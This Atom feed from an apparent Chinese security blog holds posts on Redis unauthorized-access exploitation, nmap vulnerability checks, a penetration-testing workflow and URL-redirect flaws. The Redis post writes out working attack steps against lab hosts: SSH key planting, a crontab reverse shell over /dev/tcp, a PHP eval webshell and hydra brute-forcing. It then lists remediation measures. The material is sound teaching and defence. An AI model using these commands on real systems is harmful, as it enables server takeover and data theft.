<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Y-HKL&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://y-hkl.top/"/>
  <updated>2018-03-19T05:42:02.926Z</updated>
  <id>http://y-hkl.top/</id>
  
  <author>
    <name>Y-HKL</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>redis未授权访问</title>
    <link href="http://y-hkl.top/2018/03/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://y-hkl.top/2018/03/18/redis未授权访问/</id>
    <published>2018-03-19T03:38:37.000Z</published>
    <updated>2018-03-19T05:42:02.926Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。<br><a id="more"></a></p>
<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
<p>目前比较主流的案例：yam2 minerd 挖矿程序</p>
<h2 id="Redis安全漏洞影响"><a href="#Redis安全漏洞影响" class="headerlink" title="Redis安全漏洞影响"></a>Redis安全漏洞影响</h2><p>一旦入侵成功，Redis数据会丢失，攻击者可直接添加账号用于ssh远程登录控制服务器，会给用户的 Redis 运行环境以及 Linux 主机造成安全风险，引发重要数据删除、泄露或加密勒索事件发生。<br><img src="/upload_img/redis_1.png" alt=""></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载redis<br>Wget <a href="http://download.redis.io/releases/redis-2.6.14.tar.gz" target="_blank" rel="external">http://download.redis.io/releases/redis-2.6.14.tar.gz</a><br>解压<br>tar zxvf redis-2.6.14.tar.gz<br>cd redis-2.6.14<br>编译<br>make<br><img src="/upload_img/redis_2.png" alt=""><br>cd src<br>安装<br>make install<br>启动<br>redis-server &amp;<br>连接测试<br>redis-cli<br><img src="/upload_img/redis_3.png" alt=""></p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>redis默认使用的是6379端口，可以使用nmap来验证这个漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nmap -A -p 6379 –script redis-info 192.168.10.129</div></pre></td></tr></table></figure></p>
<p><img src="/upload_img/redis_4.png" alt=""></p>
<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div><div class="line">info</div></pre></td></tr></table></figure></p>
<p><img src="/upload_img/redis_5.png" alt=""><br>可以看到Redis的版本和服务器上内核版本信息，如果是新版的Redis2.8以后的版本还可以看到Redis配置文件的绝对路径</p>
<h3 id="写入SSH公钥，获取操作系统权限"><a href="#写入SSH公钥，获取操作系统权限" class="headerlink" title="写入SSH公钥，获取操作系统权限"></a>写入SSH公钥，获取操作系统权限</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.redis对外开放，且未授权访问（默认配置）<br>2.服务器的ssh对外开放，可通过key登录</p>
<h4 id="攻击详情"><a href="#攻击详情" class="headerlink" title="攻击详情"></a>攻击详情</h4><ol>
<li>生成公钥<br>在攻击电脑上生成自己的公钥，一直按回车不用输入任何东西<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="/upload_img/redis_6.png" alt=""></p>
<ol>
<li>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</div><div class="line"></div><div class="line">cat /root/.ssh/key.txt | ./redis-cli -h 漏洞服务器IP -x set xxx</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="/upload_img/redis_7.png" alt=""></p>
<ol>
<li><p>连接漏洞服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div></pre></td></tr></table></figure>
</li>
<li><p>设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dir /root/.ssh</div><div class="line">config set dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="/upload_img/redis_8.png" alt=""></p>
<ol>
<li>使用SSH连接漏洞服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 漏洞服务器IP</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="/upload_img/redis_9.png" alt=""><br>可以看到不用密码就可以直接远程登录</p>
<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h4><p>在攻击者服务器上监听一个端口（任意端口）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div></pre></td></tr></table></figure></p>
<h4 id="攻击详情-1"><a href="#攻击详情-1" class="headerlink" title="攻击详情"></a>攻击详情</h4><p>连接redis，写入反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</div><div class="line">config set dir /var/spool/cron</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p>1分钟后客户端这边收到centos的反弹shell<br><img src="/upload_img/redis_10.png" alt=""></p>
<h3 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a>获取web服务的webshell</h3><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">config set dir /var/www/html</div><div class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</div><div class="line">config set dbfilename webshell.php</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p>注意：要知道web服务器的绝对路径</p>
<h2 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h2><p>使用hydra工具可以对redis进行暴力破解<br>hydra -P passwd.txt redis://漏洞服务器IP</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="禁止一些高危命令（重启redis才能生效）"><a href="#禁止一些高危命令（重启redis才能生效）" class="headerlink" title="禁止一些高危命令（重启redis才能生效）"></a>禁止一些高危命令（重启redis才能生效）</h3><p>修改 redis.conf 文件，禁用远程修改 DB 文件地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;&quot;</div><div class="line">rename-command CONFIG &quot;&quot;</div><div class="line">rename-command EVAL &quot;&quot;</div></pre></td></tr></table></figure></p>
<p>或者通过修改redis.conf文件，改变这些高危命令的名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;name1&quot;</div><div class="line">rename-command CONFIG &quot;name2&quot;</div><div class="line">rename-command EVAL &quot;name3&quot;</div></pre></td></tr></table></figure></p>
<h3 id="以低权限运行-Redis-服务（重启redis才能生效）"><a href="#以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="以低权限运行 Redis 服务（重启redis才能生效）"></a>以低权限运行 Redis 服务（重启redis才能生效）</h3><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</div></pre></td></tr></table></figure></p>
<h3 id="为-Redis-添加密码验证（重启redis才能生效）"><a href="#为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="为 Redis 添加密码验证（重启redis才能生效）"></a>为 Redis 添加密码验证（重启redis才能生效）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requirepass mypassword</div></pre></td></tr></table></figure>
<p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p>
<h3 id="禁止外网访问-Redis（重启redis才能生效）"><a href="#禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="禁止外网访问 Redis（重启redis才能生效）"></a>禁止外网访问 Redis（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind 127.0.0.1</div></pre></td></tr></table></figure></p>
<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
<h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p>修改配置文件redis.conf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Port 6379</div></pre></td></tr></table></figure></p>
<p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
<h3 id="保证-authorized-keys-文件的安全"><a href="#保证-authorized-keys-文件的安全" class="headerlink" title="保证 authorized_keys 文件的安全"></a>保证 authorized_keys 文件的安全</h3><p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 400 ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh/authorized_keys</div></pre></td></tr></table></figure></p>
<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chattr +i ~/.ssh</div></pre></td></tr></table></figure></p>
<h3 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>
<h3 id="安全补丁"><a href="#安全补丁" class="headerlink" title="安全补丁"></a>安全补丁</h3><p>不定期关注最新软件版本，并升级redis到最新版，防止新漏洞被利用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h2&gt;&lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="redis" scheme="http://y-hkl.top/tags/redis/"/>
    
      <category term="redis未授权访问" scheme="http://y-hkl.top/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>使用Nmap验证漏洞</title>
    <link href="http://y-hkl.top/2018/02/20/%E4%BD%BF%E7%94%A8Nmap%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/"/>
    <id>http://y-hkl.top/2018/02/20/使用Nmap验证漏洞/</id>
    <published>2018-02-20T14:12:12.000Z</published>
    <updated>2018-02-26T06:21:25.151Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章的原因有二：一是在渗透测试过程中，我们常常会用到综合扫描工具扫描目标网站，但是这种情况常常出现误报，这个时候就需要我们验证这些漏洞是否真的存在，这时候Nmap就可以使用Nmap来验证这些漏洞。二是我们使用Nmap常常只是使用它扫描端口、服务等信息这大大忽略了Nmap的强大功能。下面是我整理的一些使用Nmap扫描验证漏洞的命令，也是为了做个笔记防止忘记。<br><a id="more"></a></p>
<h2 id="Nmap的介绍"><a href="#Nmap的介绍" class="headerlink" title="Nmap的介绍"></a>Nmap的介绍</h2><p>在这里我还是啰嗦一下，介绍一下Nmap（来自百度百科）。<br>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。<br>Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。</p>
<h2 id="使用Nmap检测漏洞"><a href="#使用Nmap检测漏洞" class="headerlink" title="使用Nmap检测漏洞"></a>使用Nmap检测漏洞</h2><h3 id="http拒绝服务"><a href="#http拒绝服务" class="headerlink" title="http拒绝服务"></a>http拒绝服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --max-parallelism 800--script http-slowloris &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="IIS-短文件泄露"><a href="#IIS-短文件泄露" class="headerlink" title="IIS 短文件泄露"></a>IIS 短文件泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p 8080 --script http-iis-short-name-brute &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证http中开启的-methods-方法"><a href="#验证http中开启的-methods-方法" class="headerlink" title="验证http中开启的-methods 方法"></a>验证http中开启的-methods 方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=/www.baidu.com</div></pre></td></tr></table></figure>
<h3 id="验证HTTP-sys-远程代码执行"><a href="#验证HTTP-sys-远程代码执行" class="headerlink" title="验证HTTP.sys 远程代码执行"></a>验证HTTP.sys 远程代码执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV --script http-vuln-cve2015-1635 &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证mysql-匿名访问"><a href="#验证mysql-匿名访问" class="headerlink" title="验证mysql 匿名访问"></a>验证mysql 匿名访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script mysql-empty-password &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证CVE-2014-0160-OpenSSL-Heartbleed-bug"><a href="#验证CVE-2014-0160-OpenSSL-Heartbleed-bug" class="headerlink" title="验证CVE-2014-0160 OpenSSL Heartbleed bug"></a>验证CVE-2014-0160 OpenSSL Heartbleed bug</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p 443 --script ssl-heartbleed,ssl-known-key &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证低安全的-SSHv1，sslv2协议"><a href="#验证低安全的-SSHv1，sslv2协议" class="headerlink" title="验证低安全的 SSHv1，sslv2协议"></a>验证低安全的 SSHv1，sslv2协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script sshv1,sslv2 &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证-SSL-POODLE-information-leak"><a href="#验证-SSL-POODLE-information-leak" class="headerlink" title="验证 SSL POODLE information leak"></a>验证 SSL POODLE information leak</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -p 443 --version-light --script ssl-poodle &lt;target&gt;</div></pre></td></tr></table></figure>
<h3 id="验证弱加密SSL套件"><a href="#验证弱加密SSL套件" class="headerlink" title="验证弱加密SSL套件"></a>验证弱加密SSL套件</h3><p>nmap –script ssl-enum-ciphers <target></target></p>
<h3 id="精准地确认端口上运行的服务"><a href="#精准地确认端口上运行的服务" class="headerlink" title="精准地确认端口上运行的服务"></a>精准地确认端口上运行的服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV --script unusual-port &lt;target&gt;</div></pre></td></tr></table></figure>
<h2 id="利用NSE检测CVE漏洞"><a href="#利用NSE检测CVE漏洞" class="headerlink" title="利用NSE检测CVE漏洞"></a>利用NSE检测CVE漏洞</h2><p><a href="http://www.freebuf.com/sectool/161664.html" target="_blank" rel="external">http://www.freebuf.com/sectool/161664.html</a></p>
<h2 id="参考文件"><a href="#参考文件" class="headerlink" title="参考文件"></a>参考文件</h2><p><a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="external">http://www.nmap.com.cn/doc/manual.shtm</a><br><a href="https://thief.one/2017/05/02/1/" target="_blank" rel="external">https://thief.one/2017/05/02/1/</a><br><a href="http://blog.csdn.net/qq_29277155/article/details/50977143#t3" target="_blank" rel="external">http://blog.csdn.net/qq_29277155/article/details/50977143#t3</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写这篇文章的原因有二：一是在渗透测试过程中，我们常常会用到综合扫描工具扫描目标网站，但是这种情况常常出现误报，这个时候就需要我们验证这些漏洞是否真的存在，这时候Nmap就可以使用Nmap来验证这些漏洞。二是我们使用Nmap常常只是使用它扫描端口、服务等信息这大大忽略了Nmap的强大功能。下面是我整理的一些使用Nmap扫描验证漏洞的命令，也是为了做个笔记防止忘记。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具" scheme="http://y-hkl.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>测试流程</title>
    <link href="http://y-hkl.top/2018/01/15/%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>http://y-hkl.top/2018/01/15/测试流程/</id>
    <published>2018-01-16T03:23:45.000Z</published>
    <updated>2018-02-22T08:59:51.439Z</updated>
    
    <content type="html"><![CDATA[<p>在工作一段时间以后，对与渗透测试有了相对性的了解，下面就说一下实施一个从客户开始到渗透测试结束（简称安全测试流程），和对一个目标的渗透测试（简称渗透测试流程）的简单步骤。<br><a id="more"></a></p>
<h2 id="安全测试流程"><a href="#安全测试流程" class="headerlink" title="安全测试流程"></a>安全测试流程</h2><p>安全测试流程包括测试前期准备，测试阶段实施，复测阶段实施，成果汇报阶段四大步骤，详情如下图：<br><img src="/upload_img/测试流程-1.png" alt=""></p>
<ol>
<li>在测试前期阶段要注意全面了解需要测试的目标，范围，测试方式时间，只有了解清楚这些才可以避免以后做测试造成麻烦。</li>
<li>测试阶段实施需要注意测试的深度（测试需要做到什么地步），报告的书写等</li>
<li>复测阶段实施需要注意查看是否漏洞全部修复，是否发现新漏洞。</li>
<li>成果汇报阶段需要注意点明测试范围，成果等。</li>
</ol>
<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h3 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h3><ul>
<li>渗透测试：出于保护系统的目的，更全面地找出务器的安全隐患。</li>
<li>入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。</li>
</ul>
<h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><p><img src="/upload_img/测试流程-2.png" alt=""><br>这些流程只是一般的测试流程，对于渗透测试，每个人都有自己独自的思路。</p>
<h4 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h4><ul>
<li>确定范围：测试目标的范围，ip，域名，内外网。</li>
<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等。</li>
<li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等</li>
</ul>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>方式：主动扫描，开放搜索等<br>主动扫描：利用扫描工具（nmap，whatweb，站长工具等）<br>开放搜索：利用搜索引擎获得，后台，未授权页面，敏感url等。</p>
<ul>
<li>基础信息：IP，网段，域名，端口</li>
<li>系统信息：操作系统版本</li>
<li>应用信息：各端口的应用，例如web应用，邮件应用等等</li>
<li>版本信息：所有这些探测到的东西的版本。</li>
<li>服务信息</li>
<li>人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等。</li>
<li>防护信息：试着看能否探测到防护设备</li>
</ul>
<h4 id="漏洞探索"><a href="#漏洞探索" class="headerlink" title="漏洞探索"></a>漏洞探索</h4><p>利用上一步中列出的各种系统，应用等使用相应的漏洞。<br>方法：</p>
<ol>
<li>漏扫，awvs，IBM appscan等。</li>
<li>结合漏洞去exploit-db等位置找利用。</li>
<li>在网上寻找验证poc。<br>内容：</li>
<li>系统漏洞：系统没有及时打补丁</li>
<li>Websever漏洞：Websever配置问题</li>
<li>Web应用漏洞：Web应用开发问题</li>
<li>其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
<li>通信安全：明文传输，token在cookie中传送等。</li>
</ol>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。</p>
<ul>
<li>自动化验证：结合自动化扫描工具提供的结果</li>
<li>手工验证，根据公开资源进行验证</li>
<li>试验验证：自己搭建模拟环境进行验证</li>
<li>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</li>
<li>业务漏洞验证：如发现业务漏洞，要进行验证</li>
<li>公开资源的利用</li>
</ul>
<h4 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h4><p>为下一步实施渗透做准备。</p>
<ul>
<li>精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</li>
<li>绕过防御机制：是否有防火墙等设备，如何绕过（一般在授权测试的时候是没有防火墙的）</li>
<li>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</li>
<li>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</li>
<li>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</li>
</ul>
<h4 id="获取所需"><a href="#获取所需" class="headerlink" title="获取所需"></a>获取所需</h4><ul>
<li>实施攻击：根据前几步的结果，进行攻击</li>
<li>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</li>
<li>进一步渗透：内网入侵，敏感目标</li>
<li>持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</li>
<li>清理痕迹：清理相关日志（访问，操作），上传文件等</li>
</ul>
<h4 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h4><ul>
<li>整理渗透工具：整理渗透过程中用到的代码，poc，exp等</li>
<li>整理收集信息：整理渗透过程中收集到的一切信息</li>
<li>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</li>
</ul>
<h4 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h4><ul>
<li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li>
<li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li>
<li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</li>
</ul>
<h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><p><img src="/upload_img/测试流程-3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在工作一段时间以后，对与渗透测试有了相对性的了解，下面就说一下实施一个从客户开始到渗透测试结束（简称安全测试流程），和对一个目标的渗透测试（简称渗透测试流程）的简单步骤。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="测试流程" scheme="http://y-hkl.top/tags/%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>URL跳转漏洞</title>
    <link href="http://y-hkl.top/2018/01/11/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://y-hkl.top/2018/01/11/URL跳转漏洞/</id>
    <published>2018-01-11T06:26:35.000Z</published>
    <updated>2018-01-11T06:39:07.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。<br>由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss漏洞<br><a id="more"></a></p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>修改参数中的合法URL为非法URL，然后查看是否能正常跳转或者响应包是否包含了任意的构造URL</p>
